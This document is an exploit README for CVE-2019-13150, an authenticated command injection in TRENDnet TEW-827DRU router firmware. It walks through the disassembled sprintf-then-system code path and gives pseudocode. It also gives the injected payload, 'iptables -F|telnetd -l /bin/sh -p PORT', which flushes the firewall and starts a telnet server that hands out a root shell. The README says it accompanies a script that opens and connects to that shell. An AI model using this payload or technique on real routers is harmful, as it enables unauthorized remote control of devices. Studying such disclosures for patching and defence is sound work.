## CVE-2019-13150

**NOTE** This is not officially my CVE. I discovered it at approximately the same time as the original submitter,
but they requested the CVE first. 

This script exercises an authenticated vulnerability in the TRENDNet TEW-827DRU H/W 2.0 F/W 2.04 to open and connect to
a reverse shell.

The vulnerability is a command injection when processing an error message to inform the user about failing to resolve
the provided IP address. The string:

"echo \"ping: %s Unable to resolve, check that the name is correct" > %s"

is passed to sprintf then system. The first %s is filled with the value in 'ip_addr' field, the second is the static string
/tmp/diagnostic.

```
LOAD:00439604                 addiu   $v0, (aEchoPingSUnabl - 0x4C0000)  # "echo \"ping: %s Unable to resolve, chec"...
LOAD:00439608                 addiu   $v1, $fp, 0x258+var_224
LOAD:0043960C                 move    $a0, $v1         # s
LOAD:00439610                 move    $a1, $v0         # format
LOAD:00439614                 lw      $a2, 0x258+cp($fp)
LOAD:00439618                 la      $v0, aTDelay     # "t_delay"
LOAD:0043961C                 nop
LOAD:00439620                 addiu   $a3, $v0, (aTmpDiagnostic - 0x4C0000)  # "/tmp/diagnostic"
LOAD:00439624                 la      $v0, sprintf
LOAD:00439628                 nop
LOAD:0043962C                 move    $t9, $v0
LOAD:00439630                 jalr    $t9 ; sprintf
LOAD:00439634                 nop
LOAD:00439638                 lw      $gp, 0x258+saved_gp($fp)
LOAD:0043963C                 b       loc_4397D8
LOAD:00439640                 nop
...
LOAD:004397D8                 addiu   $v0, $fp, 0x258+var_224
LOAD:004397DC                 move    $a0, $v0         # command
LOAD:004397E0                 la      $v0, system
LOAD:004397E4                 nop
LOAD:004397E8                 move    $t9, $v0
LOAD:004397EC                 jalr    $t9 ; system
LOAD:004397F0                 nop
```

Pseudo Code:
```
sprintf(var_224, "echo \"ping: %s Unable to ...\" > %s", ip_addr, "/tmp/diagnostic");
system(var_224);
```

## Injected Command
The command that is injected in all exploits will flush `iptable` rules and execute a telnet server listening on a user 
supplied port. Upon connecting to the telnet server it will run `/bin/sh` providing a reverse shell. 

`iptables -F|telnetd -l /bin/sh -p PORT`

## Example Output
![Example Output](./img/ping_cmdinj.png)

